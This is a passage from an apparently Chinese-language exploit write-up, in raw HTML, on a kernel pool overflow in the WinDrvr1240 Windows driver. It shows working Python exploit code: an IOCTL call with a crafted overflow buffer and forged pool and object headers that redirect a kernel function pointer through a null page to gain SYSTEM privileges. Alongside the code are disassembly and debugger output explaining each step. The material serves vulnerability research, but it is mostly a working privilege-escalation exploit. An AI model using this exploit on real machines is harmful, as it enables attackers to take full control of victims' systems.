+&nbsp;&nbsp;&nbsp;&nbsp;OPEN_EXISTING&nbsp;=&nbsp;0x3
+&nbsp;&nbsp;&nbsp;&nbsp;DEVICE_NAME&nbsp;&nbsp;&nbsp;=&nbsp;&quot;\\\\.\\WinDrvr1240&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;dwReturn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;c_ulong()
+&nbsp;&nbsp;&nbsp;&nbsp;driver_handle&nbsp;=&nbsp;kernel32.CreateFileA(DEVICE_NAME,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;None,&nbsp;OPEN_EXISTING,&nbsp;0,&nbsp;None)
+&nbsp;&nbsp;&nbsp;&nbsp;inputbuffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x41414141
+&nbsp;&nbsp;&nbsp;&nbsp;inputbuffer_size&nbsp;&nbsp;=&nbsp;0x5000
+&nbsp;&nbsp;&nbsp;&nbsp;outputbuffer_size&nbsp;=&nbsp;0x5000
+&nbsp;&nbsp;&nbsp;&nbsp;outputbuffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x20000000
+&nbsp;&nbsp;&nbsp;&nbsp;alloc_pool_overflow_buffer(inputbuffer,&nbsp;inputbuffer_size)
+&nbsp;&nbsp;&nbsp;&nbsp;IoStatusBlock&nbsp;=&nbsp;c_ulong()
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;driver_handle:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dev_ioctl&nbsp;=&nbsp;ntdll.ZwDeviceIoControlFile(driver_handle,&nbsp;None,&nbsp;None,&nbsp;None,&nbsp;byref(IoStatusBlock),&nbsp;0x953824b7,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inputbuffer,&nbsp;inputbuffer_size,&nbsp;outputbuffer,&nbsp;outputbuffer_size)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False</pre><p style="white-space: normal; text-indent: 2em;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">实现溢出</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">大家可能注意到，在对缓冲区中偏移0x90的利用中，有一个空的dword。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">def&nbsp;alloc_pool_overflow_buffer(base,&nbsp;input_size):
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;Craft&nbsp;our&nbsp;special&nbsp;buffer&nbsp;to&nbsp;trigger&nbsp;the&nbsp;overflow.
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;(+)&nbsp;allocating&nbsp;pool&nbsp;overflow&nbsp;input&nbsp;buffer&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;baseadd&nbsp;&nbsp;&nbsp;=&nbsp;c_int(base)
+&nbsp;&nbsp;&nbsp;&nbsp;size&nbsp;=&nbsp;c_int(input_size)
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;&nbsp;=&nbsp;&quot;\x41&quot;&nbsp;*&nbsp;0x18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;offset&nbsp;to&nbsp;size
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x0000008d)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;controlled&nbsp;size&nbsp;(this&nbsp;triggers&nbsp;the&nbsp;overflow)
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;&quot;\x42&quot;&nbsp;*&nbsp;(0x90-len(input))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;to&nbsp;survive&nbsp;bsod
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000000)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;use&nbsp;a&nbsp;NULL&nbsp;dword&nbsp;for&nbsp;sub_4196CA
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;&quot;\x43&quot;&nbsp;*&nbsp;((0x460-0x8)-len(input))&nbsp;#&nbsp;fill&nbsp;our&nbsp;pool&nbsp;buffer</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">该溢出需要始终存在，并且不能再被处理。下列的代码可以在复制循环后直接执行：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">.text:004199ED&nbsp;loc_4199ED:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;sub_41998E+41
+.text:004199ED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;9
+.text:004199EF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx
+.text:004199F0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[ebx+90h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;controlled&nbsp;from&nbsp;the&nbsp;copy
+.text:004199F6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;void&nbsp;*
+.text:004199F7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;[edx+6Ch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;controlled&nbsp;offset
+.text:004199FA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx+90h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;controlled&nbsp;offset
+.text:00419A00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;[ebx+6Ch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;controlled&nbsp;from&nbsp;copy
+.text:00419A03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rep&nbsp;movsd
+.text:00419A05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;int
+.text:00419A06&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;sub_4196CA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;call&nbsp;sub_4196CA</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">值得注意的是，代码将会调用sub_4196CA。此外还要注意，@eax会成为我们的缓冲区+0x90（0x004199FA）。我们具体看一下这个函数调用：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">.text:004196CA&nbsp;sub_4196CA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc&nbsp;near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;sub_4195A6+1E
+.text:004196CA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;sub_41998E+78&nbsp;...
+.text:004196CA
+.text:004196CA&nbsp;arg_0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;dword&nbsp;ptr&nbsp;&nbsp;8
+.text:004196CA&nbsp;arg_4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;dword&nbsp;ptr&nbsp;&nbsp;0Ch
+.text:004196CA
+.text:004196CA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebp
+.text:004196CB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp,&nbsp;esp
+.text:004196CD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx
+.text:004196CE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx,&nbsp;[ebp+arg_4]
+.text:004196D1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
+.text:004196D2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;3C8h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;size_t
+.text:004196D7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;int
+.text:004196D9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;void&nbsp;*
+.text:004196DA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;memset
+.text:004196DF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;[ebp+arg_0]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;controlled&nbsp;buffer
+.text:004196E2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,&nbsp;edx
+.text:004196E4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,&nbsp;0Ch
+.text:004196E7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebp+arg_4],&nbsp;edx
+.text:004196EA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edi]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;make&nbsp;sure&nbsp;@eax&nbsp;is&nbsp;null
+.text:004196EC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebx],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;the&nbsp;write&nbsp;here&nbsp;is&nbsp;fine
+.text:004196EE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;eax
+.text:004196F0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loc_4197CB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;take&nbsp;the&nbsp;jump</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">该代码，会从我们在+0x90的SystemBuffer中得到一个dword值，并将其写入溢出的缓冲区之中，并检查其是否为空。如果为空，我们就不在这个函数中对其继续做处理，并且返回。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">.text:004197CB&nbsp;loc_4197CB:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;sub_4196CA+26
+.text:004197CB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi
+.text:004197CC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx
+.text:004197CD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp
+.text:004197CE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn&nbsp;&nbsp;&nbsp;&nbsp;8</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如果不这么做，在试图访问缓冲区中不存在的指针时，很有可能会出现蓝屏。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">至此，我们就可以毫无顾虑地触发eop了。关于Shellcode清理，我们溢出的缓冲区存储在@esi中，所以我们可以计算TypeIndex的偏移量，并对其进行修补。最后，建议将ObjectCreateInfo改为空，因为系统会避免使用这个指针。</span></p><p style="white-space: normal;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">打造我们的缓冲区</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">考虑到在每一次循环时，都会复制0x8字节，并且起始索引是0x1c：</span></p><pre class="brush:bash;toolbar:false">.text:004199D3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;[ebx+1Ch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;index&nbsp;offset&nbsp;for&nbsp;the&nbsp;first&nbsp;write</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">假设我们希望得到44字节（0x2c）的缓冲区溢出，我们用缓冲区的大小，减去头部，减去起始索引偏移量，加上想要溢出的字节数，最后将其除以0x8（这是因为每次循环都复制0x8字节）。</span></p><pre class="brush:plain;toolbar:false">(0x460&nbsp;–&nbsp;0x8&nbsp;–&nbsp;0x1c&nbsp;+&nbsp;0x2c)&nbsp;/&nbsp;0x8&nbsp;=&nbsp;0x8d</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">也就是说，0x8d的大小会使缓冲区溢出0x2c（即44字节），并能损坏池的头部、引用和对象头。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">#&nbsp;repair&nbsp;the&nbsp;allocated&nbsp;chunk&nbsp;header...
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x040c008c)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_POOL_HEADER
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0xef436f49)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_POOL_HEADER&nbsp;(PoolTag)
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000000)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER_QUOTA_INFO
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x0000005c)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER_QUOTA_INFO
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000000)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER_QUOTA_INFO
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000000)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER_QUOTA_INFO
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000001)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER&nbsp;(PointerCount)
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000001)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER&nbsp;(HandleCount)
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000000)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER&nbsp;(Lock)
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00080000)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER&nbsp;(TypeIndex)
+&nbsp;&nbsp;&nbsp;&nbsp;input&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x00000000)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_OBJECT_HEADER&nbsp;(ObjectCreateInfo)</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">当我们将到0x00080000（实际上是较小的一个值）的TypeIndex为null。这意味着，函数表会指向0x0，并且我们可以映射空页。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dd&nbsp;nt!ObTypeIndexTable&nbsp;L2
+82b7dee0&nbsp;&nbsp;00000000&nbsp;bad0b0b0</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">请注意，这里的第二个索引是0xbad0b0b0。这样的方法同样可以用于x64系统。</span></p><p style="white-space: normal;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">触发内核中的代码执行</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在触发了溢出后，它存活了下来。但为了获得eop，我们需要设置一个指向0x00000074的指针，以利用<strong>OkayToCloseProcedure</strong>函数指针。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dt&nbsp;nt!_OBJECT_TYPE&nbsp;name&nbsp;84fc8040
+&nbsp;&nbsp;&nbsp;+0x008&nbsp;Name&nbsp;:&nbsp;_UNICODE_STRING&nbsp;&quot;IoCompletionReserve&quot;
+kd&gt;&nbsp;dt&nbsp;nt!_OBJECT_TYPE&nbsp;84fc8040&nbsp;.
+&nbsp;&nbsp;&nbsp;+0x000&nbsp;TypeList&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;[&nbsp;0x84fc8040&nbsp;-&nbsp;0x84fc8040&nbsp;]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Flink&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x84fc8040&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x84fc8040&nbsp;-&nbsp;0x84fc8040&nbsp;]
